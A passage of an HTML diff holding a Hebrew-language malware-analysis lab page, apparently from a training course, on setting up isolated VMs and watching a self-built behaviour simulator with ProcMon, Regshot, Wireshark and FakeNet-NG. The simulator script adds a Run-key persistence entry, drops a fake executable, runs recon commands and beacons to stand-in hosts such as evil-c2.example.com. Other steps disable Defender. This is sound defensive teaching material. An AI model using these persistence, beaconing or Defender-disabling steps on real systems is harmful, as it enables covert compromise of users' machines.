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" alt="CyberLabs">
+  <h1>מעבדה 3: Dynamic Analysis Bench</h1>
+  <div class="subtitle">יום 5 — Malware Analysis & SIEM Fundamentals</div>
+  <div class="meta">
+    <span>זמן משוער: 60 דקות</span>
+    <span>רמה: בינונית-מתקדמת</span>
+    <span>סביבה: Windows VM מבודדת + FakeNet</span>
+  </div>
+</div>
+
+<div class="container">
+
+<div class="section">
+  <h2>מטרות (Objectives)</h2>
+  <ul class="prereq">
+    <li>להקים סביבת sandbox מבודדת עם Snapshot</li>
+    <li>להפעיל ProcMon, Wireshark, Regshot, FakeNet במקביל</li>
+    <li>להריץ סימולטור התנהגות שפיר ולתפוס פעילות</li>
+    <li>לזהות persistence, file drops, ו-recon commands</li>
+    <li>ללכוד תעבורת DNS/HTTP מדומה ב-FakeNet</li>
+    <li>לבנות timeline של ההתנהגות</li>
+    <li>למפות ל-MITRE ATT&CK</li>
+  </ul>
+</div>
+
+<div class="section">
+  <h2>הקמת VM — שלב אחר שלב (קרא קודם, בצע פעם אחת)</h2>
+  <div class="warning">בצע <strong>הכל</strong> בתוך Virtual Machine. לעולם לא על המחשב האמיתי. בתוך ה-VM אתה root/Administrator — לא צריך הרשאות אדמין על המארח.</div>
+
+  <h3>חלוקת זמן</h3>
+  <pre>הורדת VirtualBox:      5 דקות
+הורדת Kali VM:        30 דקות (~3 GB)
+הורדת Win10 ISO:      30 דקות (~5 GB)
+יצירה והפעלת Kali:    10 דקות
+יצירה והפעלת Win10:   20 דקות
+הקמת snapshots:        5 דקות
+סה"כ חד-פעמי:        ~100 דקות</pre>
+
+  <h3>חלק 1 — התקנת VirtualBox (כל מערכת הפעלה)</h3>
+  <ol class="steps">
+    <li class="step"><div class="step-title">1.1 הורד installer</div>
+      <pre>https://www.virtualbox.org/wiki/Downloads
+בחר:  Windows hosts  /  macOS / Intel hosts  /  Linux distributions
+      (Mac עם Apple Silicon? השתמש ב-UTM: https://mac.getutm.app/)</pre></li>
+    <li class="step"><div class="step-title">1.2 הרץ installer</div>
+      <pre>Windows:   לחיצה כפולה על .exe → Next, Next, Next, Install → Finish
+macOS:     לחיצה כפולה על .dmg → גרור VirtualBox ל-Applications
+           → אם חסום: System Settings → Privacy → "Allow" Oracle
+Linux:     sudo apt install virtualbox virtualbox-ext-pack</pre></li>
+    <li class="step"><div class="step-title">1.3 ודא</div>
+      <pre>פתח VirtualBox → תפריט Help → About
+אמור להופיע: "Oracle VirtualBox 7.x"</pre>
+      <div class="success">חלון VirtualBox נפתח. אין שגיאות. רשימת VM ריקה.</div></li>
+  </ol>
+
+  <h3>חלק 2 — יצירת Kali Linux VM (מעבדות 1, 4, 5)</h3>
+  <ol class="steps">
+    <li class="step"><div class="step-title">2.1 הורד Kali VM מוכן</div>
+      <pre>https://www.kali.org/get-kali/#kali-virtual-machines
+→ לחץ על טאב "VirtualBox"
+→ לחץ "64-bit"  (~3 GB קובץ .7z)
+→ המתן לסיום ההורדה</pre>
+      <div class="note">מוכן מראש = אין צורך בהתקנה. ה-.7z מכיל דיסק VM מוכן.</div></li>
+    <li class="step"><div class="step-title">2.2 חלץ את ה-.7z</div>
+      <pre>Windows: התקן 7-Zip מ-7-zip.org, לחיצה ימנית על .7z → 7-Zip → Extract Here
+macOS:   התקן Keka מ-keka.io, לחיצה כפולה על ה-.7z
+Linux:   sudo apt install p7zip-full; 7z x kali-linux-*.7z
+תוצאה:   תיקייה עם  kali-linux-*.vbox  +  .vdi</pre></li>
+    <li class="step"><div class="step-title">2.3 ייבוא ל-VirtualBox</div>
+      <pre>1. פתח VirtualBox
+2. תפריט: Machine → Add  (או Ctrl+A)
+3. נווט לתיקייה שחילצת
+4. בחר את קובץ ה-.vbox → Open
+5. ה-VM מופיע ברשימה השמאלית כ-"kali-linux-..."</pre></li>
+    <li class="step"><div class="step-title">2.4 כוונון משאבי VM (מארח חלש)</div>
+      <pre>לחיצה ימנית על ה-VM → Settings:
+
+System → Motherboard tab:    Base Memory = 4096 MB  (או 3072 אם המארח חלש)
+System → Processor tab:      CPUs = 2
+Display → Screen tab:        Video Memory = 64 MB ; בטל 3D Acceleration
+Audio:                       בטל "Enable Audio"
+USB:                         בחר USB 1.1 (לא 3.0)
+Network → Adapter 1:         Attached to: NAT  (מאפשר אינטרנט ל-VirusTotal)
+
+לחץ OK</pre></li>
+    <li class="step"><div class="step-title">2.5 הפעלה ראשונה</div>
+      <pre>לחיצה כפולה על Kali VM → המתן לטעינת שולחן העבודה
+משתמש: kali
+סיסמה: kali
+פתח Terminal (אייקון בפינה שמאל-עליון)
+הרץ:  whoami    →  אמור להציג: kali
+הרץ:  sudo -v   →  הכנס "kali" → אין שגיאה = sudo עובד</pre>
+      <div class="success">שולחן העבודה של Kali נטען. Terminal נפתח. <code>sudo apt update</code> מצליח.</div></li>
+    <li class="step"><div class="step-title">2.6 צילום snapshot של מצב נקי</div>
+      <pre>בחלון VirtualBox של ה-VM: Machine → Take Snapshot
+שם: "clean-kali"
+תיאור: "Kali טרי, sudo עובד"
+→ OK</pre>
+      <div class="note">Snapshot = נקודת שמירה. אם משהו נשבר, שחזור תוך 5 שניות.</div></li>
+  </ol>
+
+  <h3>חלק 3 — יצירת Windows 10 VM (מעבדות 2, 3 — דלג אם רק 1,4,5)</h3>
+  <ol class="steps">
+    <li class="step"><div class="step-title">3.1 הורד Win10 Enterprise Eval ISO</div>
+      <pre>https://www.microsoft.com/evalcenter/evaluate-windows-10-enterprise
+→ הירשם (כל אימייל עובד) → בחר ISO → 64-bit English
+→ ~5 GB הורדה. חינם ל-90 יום.</pre></li>
+    <li class="step"><div class="step-title">3.2 צור VM חדש ב-VirtualBox</div>
+      <pre>תפריט: Machine → New
+Name:           Win10-Lab
+Type:           Microsoft Windows
+Version:        Windows 10 (64-bit)
+Memory:         4096 MB
+Hard disk:      Create a virtual hard disk now → VDI → Dynamically allocated → 60 GB
+→ Create</pre></li>
+    <li class="step"><div class="step-title">3.3 חבר את ה-ISO</div>
+      <pre>Settings → Storage → Empty (אייקון CD) → לחץ אייקון CD מימין →
+Choose a disk file → בחר את Win10 ISO → OK
+Network → Adapter 1: NAT (לבינתיים; החלף ל-Host-Only במעבדה 3)
+Display → Video Memory 128 MB</pre></li>
+    <li class="step"><div class="step-title">3.4 התקן Windows (Next, Next, Next)</div>
+      <pre>הפעל VM → לחץ מקש לאתחול מ-CD
+שפה: English → Next → Install now
+"I don't have a product key" → Windows 10 Enterprise → Custom install
+בחר את הדיסק היחיד → Next → המתן 15 דקות
+אזור: בחר שלך → "Domain join instead" → username: lab → בלי סיסמה
+בטל אופציות telemetry → Cortana off → סיים</pre></li>
+    <li class="step"><div class="step-title">3.5 ודא Administrator</div>
+      <pre>לחיצה ימנית על Start → Windows PowerShell (Admin) → Yes
+PS> whoami
+     win10-lab\lab
+PS> whoami /groups | findstr "S-1-16-12288"
+     Mandatory Label\High Mandatory Level   Label   S-1-16-12288
+זה מאשר admin token. אתה אדמין.</pre></li>
+    <li class="step"><div class="step-title">3.6 Snapshot לפני כל מעבדה</div>
+      <pre>תפריט VM: Machine → Take Snapshot → "clean-win10" → OK</pre>
+      <div class="warning">תמיד שחזר snapshot זה לפני הרצה חוזרת של מעבדות 2 או 3.</div></li>
+  </ol>
+
+  <h3>בעיות נפוצות ופתרונות</h3>
+  <pre>בעיה                                       פתרון
+─────────────────────────────────────      ─────────────────────────────────────
+שגיאת "VT-x is not available"               אתחל מארח → היכנס ל-BIOS (F2/Del) →
+                                           הפעל Intel VT-x או AMD-V → שמור
+VM איטי מאוד                                הפחת RAM של VM ל-3072 ; סגור אפליקציות
+                                           על המארח ; בטל 3D accel
+"אין אינטרנט בתוך VM"                       Settings → Network → Adapter 1 →
+                                           NAT ; אתחל VM
+Kali מבקש sudo כל פעם                       ברירת מחדל. לביטול: sudo visudo →
+                                           הוסף: kali ALL=(ALL) NOPASSWD: ALL
+דיסק מלא ב-Kali                             VirtualBox: File → Tools → Virtual
+                                           Media Manager → הגדל .vdi → בתוך
+                                           Kali: sudo cfdisk + resize2fs
+התראת activation ב-Win10                    התעלם. Eval עובד 90 יום מלאים.
+שחזור snapshot נכשל                         כבה VM לחלוטין קודם, אז לחיצה ימנית
+                                           על snapshot → Restore</pre>
+
+  <h3>בדיקת שפיות לפני כל מעבדה</h3>
+  <pre>[ ] VM דולק, שולחן העבודה טעון
+[ ] צולם snapshot נקי
+[ ] אינטרנט עובד בתוך VM (ping 8.8.8.8)
+[ ] אתה root/admin בתוך VM (whoami)
+[ ] במארח יש לפחות 4 GB RAM פנויים ל-VM
+[ ] אין VM אחר רץ במקביל</pre>
+</div>
+
+<div class="section">
+  <h2>דרישות מקדימות</h2>
+  <ul class="prereq">
+    <li>Windows 10 VM עם Snapshot נקי (חובה!)</li>
+    <li>רשת מוגדרת ל-Host-Only Adapter</li>
+    <li>Windows Defender כבוי (Real-time + Cloud)</li>
+    <li>ProcMon, Process Explorer מ-Sysinternals Suite</li>
+    <li>Wireshark מותקן</li>
+    <li>Regshot מותקן</li>
+    <li>FakeNet-NG (<a href="https://github.com/mandiant/flare-fakenet-ng">github.com/mandiant/flare-fakenet-ng</a>)</li>
+    <li>סימולטור התנהגות שפיר מהמדריך: <code>behavior-sim.exe</code></li>
+  </ul>
+  <div class="warning">לעולם לא להריץ נוזקה אמיתית מחוץ ל-VM. לוודא שהרשת Host-Only לפני הרצה. תמיד לשחזר Snapshot אחרי.</div>
+</div>
+
+<div class="section">
+  <h3>השתמש שוב ב-Win10 VM ממעבדה 2</h3>
+  <div class="note">אותו Win10 VM כמו מעבדה 2. שחזר snapshot "clean-win10", התקן FakeNet-NG + Wireshark + Regshot, צלם snapshot חדש "lab3-ready" לפני הרצת הסימולטור.</div>
+  <pre># Host-Only network לא דורש הרשאות אדמין במארח — זו הגדרת VirtualBox/VMware
+# VirtualBox: VM Settings -> Network -> Adapter 1 -> Attached to: Host-only Adapter
+# ודא ש-vboxnet0 (או VMnet1) קיים בהגדרות הרשת של המארח
+
+# התקנת FakeNet-NG בתוך ה-VM (שורה אחת, לא דורש אדמין במארח)
+powershell -c "iwr https://github.com/mandiant/flare-fakenet-ng/releases/latest/download/fakenet1.4.13.zip -OutFile C:\Tools\fakenet.zip; Expand-Archive C:\Tools\fakenet.zip C:\Tools\fakenet-ng"
+
+# התקנת Wireshark בתוך ה-VM
+winget install -e --id WiresharkFoundation.Wireshark
+
+# התקנת Regshot בתוך ה-VM (נייד, ללא מתקין — רק לחלץ)
+# הורידו את ה-.zip מ-https://sourceforge.net/projects/regshot/
+# וחלצו אל C:\Tools\Regshot\
+powershell -c "iwr https://master.dl.sourceforge.net/project/regshot/regshot/1.9.0/Regshot-1.9.0.7z -OutFile C:\Tools\regshot.7z"</pre>
+</div>
+
+<div class="section">
+  <h2>בנה את Behavior Simulator בעצמך</h2>
+  <pre># בתוך Win10 VM (PowerShell כאדמין):
+# השתמש שוב ב-Python ממעבדה 2 אם הותקן.
+mkdir C:\Tools\behavior-sim 2>$null
+@'
+import os, socket, time, urllib.request, subprocess, winreg, sys
+
+# Recon
+subprocess.run(["systeminfo"], capture_output=True)
+subprocess.run(["whoami","/all"], capture_output=True)
+subprocess.run(["net","user"], capture_output=True)
+
+# File drop
+drop = os.path.expandvars(r"%APPDATA%\sim_payload.tmp")
+open(drop,"wb").write(b"\x4D\x5A" + b"\x00"*1022)
+
+# Persistence
+k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+    r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+winreg.SetValueEx(k, "BehaviorSim", 0, winreg.REG_SZ, sys.executable + " " + __file__)
+winreg.CloseKey(k)
+
+# DNS + HTTP מזויפים (FakeNet יתפוס)
+for host in ["evil-c2.example.com","data-exfil.example.com","update-srv.example.com"]:
+    try:
+        socket.gethostbyname(host)
+        urllib.request.urlopen(f"http://{host}/beacon", timeout=2).read()
+    except: pass
+
+time.sleep(30)
+'@ | Out-File -Encoding ASCII C:\Tools\behavior-sim\behavior-sim.py
+
+cd C:\Tools\behavior-sim
+python -m PyInstaller --onefile behavior-sim.py
+copy dist\behavior-sim.exe C:\Tools\behavior-sim.exe</pre>
+  <div class="success"><code>C:\Tools\behavior-sim.exe</code> קיים. בהפעלה עם FakeNet פעיל, ProcMon מתעד file drops ב-<code>%APPDATA%</code>, כתיבות registry ל-HKCU Run, ו-FakeNet מתעד שאילתות DNS ל-evil-c2/data-exfil/update-srv.</div>
+</div>
+
+<div class="section">
+  <h2>קריטריוני הצלחה — המעבדה עוברת כאשר</h2>
+  <pre>[ ] Host-Only network אומת (לסימולטור אין אינטרנט אמיתי)
+[ ] לוג FakeNet מציג 3 שאילתות DNS ולפחות בקשת HTTP GET אחת
+[ ] ProcMon מציג WriteFile ל-%APPDATA%\sim_payload.tmp
+[ ] diff של Regshot מציג ערך חדש ב-HKCU Run "BehaviorSim"
+[ ] capture של Wireshark נשמר כ-PCAP
+[ ] timeline התנהגות (txt) ממפה אירועים ל-MITRE T1071, T1547.001, T1059
+[ ] Snapshot "clean-win10" שוחזר אחרי המעבדה</pre>
+</div>
+
+<div class="section">
+  <h2>שלבי המעבדה</h2>
+  <ol class="steps">
+    <li class="step">
+      <div class="step-title">שלב 1 — הכנת ה-VM</div>
+      <pre># 1. צלם Snapshot נקי
+# VirtualBox: Machine -&gt; Take Snapshot -&gt; "clean-baseline"
+
+# 2. הגדר רשת ל-Host-Only
+# VM Settings -&gt; Network -&gt; Adapter 1 -&gt; Host-only Adapter
+
+# 3. כבה Defender
+# PowerShell as Admin:
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableBehaviorMonitoring $true
+Set-MpPreference -DisableScriptScanning $true
+
+# 4. וודא Defender כבוי
+Get-MpPreference | Select Disable*
+
+# 5. כבה Windows Update
+# services.msc -&gt; Windows Update -&gt; Stop + Disabled</pre>
+    </li>
+    <li class="step">
+      <div class="step-title">שלב 2 — הפעלת FakeNet-NG</div>
+      <pre># FakeNet מדמה DNS, HTTP, HTTPS, SMTP, FTP — וקולט הכל
+# פתח CMD as Administrator
+cd C:\Tools\fakenet-ng
+fakenet.exe
+
+# פלט צפוי:
+# [FakeNet]    Listening on 0.0.0.0:80 (HTTP)
+# [FakeNet]    Listening on 0.0.0.0:443 (HTTPS)
+# [FakeNet]    Listening on 0.0.0.0:53 (DNS)
+# [FakeNet]    Listening on 0.0.0.0:25 (SMTP)
+# ...
+# [FakeNet]    Diverting traffic...
+
+# השאר חלון FakeNet פתוח — זה הלוג של תעבורת הנוזקה</pre>
+              <div class="note">FakeNet-NG מטעה את הנוזקה לחשוב שיש לה אינטרנט אמיתי. כל שאילתת DNS, HTTP, וכו' נרשמת בחלון FakeNet עם פרטים מלאים.</div>
+    </li>
+    <li class="step">
+      <div class="step-title">שלב 3 — Regshot 1st Snapshot</div>
+      <pre># הפעל Regshot
+C:\Tools\Regshot\Regshot-x64-Unicode.exe
+
+# הגדרות:
+# - Scan dir1 -&gt; C:\Users\[username]\AppData (לזיהוי file drops)
+# - Output format -&gt; HTML
+
+# לחץ "1st shot" -&gt; "Shot"
+# המתן 30-60 שניות לסריקה</pre>
+    </li>
+    <li class="step">
+      <div class="step-title">שלב 4 — הפעלת ProcMon</div>
+      <pre>C:\Tools\Sysinternals\Procmon64.exe
+
+# Ctrl+E להתחלת לכידה
+# Ctrl+R לאיפוס לוג קיים
+
+# הגדר פילטר שם:
+# Filter -&gt; Filter...
+# Process Name -&gt; is -&gt; behavior-sim.exe -&gt; Include
+# Add -&gt; OK
+
+# פילטר נוסף — תהליכי בנים שלו:
+# Process Name -&gt; is -&gt; cmd.exe -&gt; Include
+# Process Name -&gt; is -&gt; powershell.exe -&gt; Include</pre>
+    </li>
+    <li class="step">
+      <div class="step-title">שלב 5 — הפעלת Wireshark</div>
+      <pre># פתח Wireshark כ-Admin
+# בחר את ה-Adapter Host-only
+# לחץ Start (כפתור ירוש)
+
+# פילטרים שימושיים:
+# dns                  -&gt; שאילתות DNS
+# http                 -&gt; HTTP traffic
+# tcp.port == 4444     -&gt; reverse shell
+# tcp.port == 8080     -&gt; alt-HTTP / C2
+# !arp && !mdns        -&gt; הסר רעש</pre>
+    </li>
+    <li class="step">
+      <div class="step-title">שלב 6 — הרצת הסימולטור</div>
+      <pre># הרץ behavior-sim.exe (מהמדריך)
+# הסימולטור יבצע:
+# - יצירת קובץ ב-%TEMP%
+# - registry persistence
+# - DNS query לדומיין מדומה
+# - HTTP request לעמוד מדומה
+# - הפעלת cmd.exe לפקודות recon (whoami, ipconfig, net user)
+
+C:\Tools\behavior-sim.exe
+
+# המתן 60-90 שניות
+# במהלך ההמתנה — צפה ב-FakeNet, ProcMon, Wireshark</pre>
+    </li>
+    <li class="step">
+      <div class="step-title">שלב 7 — עצירת לכידות</div>
+      <pre># Wireshark: Ctrl+E (Stop)
+# ProcMon: Ctrl+E (Stop)
+# Regshot: לחץ "2nd shot" -&gt; "Shot"
+
+# שמור את הלוגים:
+# Wireshark: File -&gt; Save As -&gt; capture.pcap
+# ProcMon: File -&gt; Save -&gt; All Events -&gt; CSV -&gt; procmon.csv
+# Regshot: לחץ "Compare" -&gt; HTML output</pre>
+    </li>
+    <li class="step">
+      <div class="step-title">שלב 8 — ניתוח Regshot Diff</div>
+      <pre># הדו"ח של Regshot מציג:
+# Keys added:    X
+# Values added:  Y (זה ה-PERSISTENCE)
+# Files added:   Z (זה ה-FILE DROPS)
+
+# חיפוש Persistence:
+# HKCU\Software\Microsoft\Windows\CurrentVersion\Run\
+# HKLM\Software\Microsoft\Windows\CurrentVersion\Run\
+
+# חיפוש File Drops:
+# C:\Users\[user]\AppData\Local\Temp\
+# C:\Users\[user]\AppData\Roaming\
+
+# תעד 3 IOCs מינימום</pre>
+    </li>
+    <li class="step">
+      <div class="step-title">שלב 9 — ניתוח ProcMon</div>
+      <pre># סינונים מועילים בתוך ProcMon:
+
+# רק יצירת קבצים:
+# Operation -&gt; is -&gt; CreateFile -&gt; Include
+# Result -&gt; is -&gt; SUCCESS -&gt; Include
+
+# רק שינויי Registry:
+# Operation -&gt; is -&gt; RegSetValue -&gt; Include
+
+# רק תהליכים חדשים:
+# Operation -&gt; is -&gt; Process Create -&gt; Include
+# (יראה את כל ה-children: cmd.exe, powershell.exe, וכו')
+
+# רק חיבורי רשת:
+# Operation -&gt; contains -&gt; TCP -&gt; Include
+
+# Tree View:
+# Tools -&gt; Process Tree
+# (מראה את כל עץ התהליכים החדש שנוצר)</pre>
+    </li>
+    <li class="step">
+      <div class="step-title">שלב 10 — ניתוח Wireshark + FakeNet</div>
+      <pre># Wireshark Analysis -&gt;
+# Statistics -&gt; Conversations -&gt; TCP
+# מציג כל "שיחה" (src/dst pair)
+
+# ייצוא קבצים מ-HTTP:
+# File -&gt; Export Objects -&gt; HTTP
+
+# ב-FakeNet בחלון:
+# יש לוג של כל DNS query, HTTP GET/POST,
+# קבצים שהורדו ועוד
+
+# tshark CLI:
+tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name | sort -u
+tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri</pre>
